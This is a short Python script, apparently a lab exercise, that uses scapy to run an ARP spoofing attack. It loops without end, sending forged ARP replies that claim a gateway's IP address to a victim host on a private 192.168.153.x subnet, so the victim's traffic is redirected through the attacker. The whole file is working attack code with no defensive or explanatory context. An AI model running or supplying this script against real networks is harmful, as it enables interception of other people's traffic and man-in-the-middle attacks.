import socket

from whois import whois

from scapy.all import *
from random import randint
import time


def main():
    gatewayIP="192.168.153.2"
    victimIP = "192.168.153.136"

    hackMAC = "00:50:56:29:3b:23"
    victimMAC="00:0c:29:4c:9f:51"

    # print(getmacbyip("192.168.153.136"))

    packet = Ether()/ARP(psrc=gatewayIP, pdst=victimIP)
    while True:
        sendp(packet)
        time.sleep(2)
        print(packet.show())




if __name__ == '__main__':
    main()
